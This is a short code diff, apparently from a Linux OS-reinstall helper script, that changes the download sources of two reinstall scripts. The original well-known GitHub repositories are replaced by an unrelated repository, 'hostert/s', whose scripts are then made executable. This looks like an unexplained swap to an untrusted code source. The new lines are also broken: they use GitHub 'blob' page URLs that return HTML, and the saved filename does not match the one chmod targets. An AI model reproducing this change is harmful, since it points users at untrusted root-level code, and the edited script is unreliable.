@@ -114,12 +114,12 @@ main() {
     
     # 获取安装脚本
     if [ ! -f "InstallNET.sh" ]; then
-        wget https://raw.githubusercontent.com/leitbogioro/Tools/master/Linux_reinstall/InstallNET.sh
+        wget https://github.com/hostert/s/blob/s/installnet.sh
         chmod +x InstallNET.sh
     fi
     
     if [ ! -f "reinstall.sh" ]; then
-        curl -O https://raw.githubusercontent.com/bin456789/reinstall/main/reinstall.sh
+        curl -O https://github.com/hostert/s/blob/s/reinstall.sh
         chmod +x reinstall.sh
     fi
 
